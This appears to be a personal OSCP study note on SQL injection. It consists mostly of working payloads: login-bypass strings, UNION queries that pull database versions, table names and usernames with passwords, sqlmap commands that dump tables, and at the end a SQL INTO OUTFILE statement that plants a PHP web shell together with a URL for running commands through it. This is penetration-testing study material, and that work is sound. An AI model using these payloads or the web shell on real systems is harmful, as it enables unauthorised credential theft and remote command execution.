[[Synced OSCP Notes/Tools/SQLmap|SQLmap]]

```
cd /usr/share/wordlists/seclists/Fuzzing/Databases/
```

```
cat /usr/share/wordlists/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt
```

---
# 🧠 SQL Injection Payloads (Auth Bypass / Login Bypass)

## 🔓 Basic authentication bypass

```
' OR 1=1--
```

```
' OR '1'='1--
```

```
' OR ''=''
```

---

## 👤 Username-based bypass

```
<username>' OR 1=1--
```

```
<username>'--
```

---

## 🧪 Common tautology bypass

```
' OR '1'='1'--
```

```
' OR 'a'='a'--
```

---

# SQL Injection

```
# LOGIN FORM
username: ***
password: ***
```

```sqlite
SELECT * FROM user_table WHERE username='' AND password='';
```

# ALWAYS TRUE ATTACK

## ERROR-BASED SQLi, Always True Attack

```
# LOGIN FORM
username: admin
password: 1234
```

```
'
username: admin'
password: 1234
```

```sqlite
SELECT * FROM user_table WHERE username='admin'' AND password='1234';
```

```
' OR 1=1
username: admin' OR 1=1
password: 1234
```

```sqlite
SELECT * FROM user_table WHERE username='admin' OR 1=1' AND password='1234';
```

```
' OR 1=1 ; -- 
username: admin' OR 1=1
password: 1234
```

```sqlite
SELECT * FROM user_table WHERE username='admin' OR 1=1; -- ' AND password='1234';

SELECT * FROM user_table WHERE username='admin' OR 1=1;
SELECT * FROM user_table WHERE 1=1;
SELECT * FROM user_table;
```

---
## 🧬 UNION-based injection (data extraction / testing columns)

```
' UNION SELECT 1, '<user-fieldname>', '<pass-fieldname>'--
```


---
## SQL injection UNION attack, determining the number of columns returned by the query


1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
3. Modify the `category` parameter to add an additional column containing a null value:
    
    `'+UNION+SELECT+NULL,NULL--`
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

## Test which column is text

```
'+UNION+SELECT+NULL,NULL,NULL--
```

or use #

Replace the NULL with 'a'

```
'+UNION+SELECT+NULL,'a',NULL--
```


## The database contains a different table called `users`, with columns called `username` and `password`.

' UNION SELECT username, password FROM users--


## Find out number of columns + which column accepts string, then payload 

```
username||'~'||password+FROM+users--
```

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

---

## Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

|                  |                           |
| ---------------- | ------------------------- |
| Database type    | Query                     |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could use a `UNION` attack with the following input:

```
'+UNION+SELECT+@@version
```

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`

---

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

```
SELECT * FROM information_schema.tables
```

This returns output like the following:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

This returns output like the following:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
| ------------- | ------------ | ---------- | ----------- | --------- |
| MyDatabase    | dbo          | Users      | UserID      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |

This output shows the columns in the specified table and the data type of each column.

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
1. Find the name of the table containing user credentials.
2. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

1. Find the names of the columns containing usernames and passwords.
2. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    

```
'+UNION+SELECT+username_wlpbfk,+password_nskzww+FROM+users_gowlqt--
```

---


SQLMAP

Intercept a web request of "test", copy the post request and save it to a file called reset.req

Feed this to SQLmap

```
sqlmap -r reset.req -p email --batch
```

```
sqlmap -r reset.req -p email --batch --level 3
```

get a list of the available databases
```
sqlmap -r reset.req -p email --batch --level 3 --dbs
```

enumerate tables in database
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] --tables --threads=10
```

dump a table's contents
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] -T [table_name] --dump
```

---

[[Hashcat|Hashcat]]

---

![[Pasted image 20260526210214.png]]

```
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```
 
Burpsuite payload, upload a webshell.

Since nmap scan told us port 3305 is open, we are uploading the webshell there

Visit
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}:3305/webshell.php?cmd=id`;

dv.paragraph("```bash\n" + command + "\n```");
```
